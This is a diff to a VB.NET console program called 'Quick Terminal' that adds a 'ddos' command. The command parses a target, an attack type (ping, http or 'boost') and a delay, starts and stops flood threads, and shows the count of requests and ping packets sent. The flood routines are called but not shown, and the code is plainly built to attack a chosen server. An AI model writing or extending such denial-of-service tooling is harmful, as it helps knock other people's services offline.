@@ -440,4 +440,76 @@ b:
             Return "Error"
         End Try
     End Function
+
+    Public Sub DUI(ByVal Args() As String)
+        If Args(1) = "make" Then
+            Boost_Make()
+        ElseIf Args(1) = "ping" Then
+            If Args.Length <= 2 Then
+                Console.WriteLine("Missing Args")
+            ElseIf Args.Length = 3 Then
+                Start(Args(2), "ping")
+            ElseIf Args.Length >= 4 Then
+                Start(Args(2), "ping", Args(3))
+            Else
+                Console.WriteLine("Wrong syntax. Proper syntax is: ddos <target> <type> <delay>")
+            End If
+        ElseIf Args(1) = "help" Then
+            help()
+        ElseIf Args(1) = "http" Then
+            If Args.Length = 3 Then
+                Start(Args(2), "http")
+            ElseIf Args.Length = 4 Then
+                Start(Args(2), "http", Args(3))
+            Else
+                Console.WriteLine("Wrong syntax. Proper syntax is: ddos <target> <type> <delay>")
+            End If
+        ElseIf Args(1) = "boost" Then
+            If Args.Length <= 2 Then
+                Console.WriteLine("Missing Args")
+            ElseIf Args.Length = 2 Then
+                Boost_Start(Args(2), Args(3))
+            ElseIf Args.Length = 4 Then
+                Boost_Start(Args(2), Args(3))
+            Else
+                Console.WriteLine("Wrong syntax. Proper syntax is: ddos <target> <booster> <delay>")
+            End If
+        ElseIf Args(1) = "stat" Then
+            Console.WriteLine("You sent: " & REQ & vbNewLine & "The server sent: " & Reply & vbNewLine & "Ping Packets Sent: " & Psent)
+        ElseIf Args(1) = "update" Then
+            Console.WriteLine("Adding requests to title bar. To stop type ddos stop")
+            Dim ddosUpdate As New Threading.Thread(AddressOf ddosUpdateSub)
+            ddosUpdate.Start()
+        ElseIf Args(1) = "stop" Then
+            Attack_Stop = True
+            Thread.Sleep(1000)
+            If Attack_Type = "Boost" Then
+                Do Until threadNum = 30
+                    Thread.Sleep(1000)
+                Loop
+            ElseIf Attack_Type = "http" Or Attack_Type = "ping" Then
+                Do Until threadNum = 5
+                    Thread.Sleep(1000)
+                Loop
+            End If
+        Else
+            Console.WriteLine("Command not found.")
+        End If
+    End Sub
+
+    Private Sub ddosUpdateSub()
+        TRunning += 1
+a:
+        Console.Title = "Quick Terminal - REQ: " & REQ & " - Ping: " & Psent
+        If Attack_Stop = True Then
+            Console.WriteLine("DDOS Updater stoped.")
+            Console.Title = "Quick Terminal"
+            Main2()
+            TRunning -= 1
+            Exit Sub
+        End If
+        Thread.Sleep(10)
+        GoTo a
+    End Sub
+
 End Class
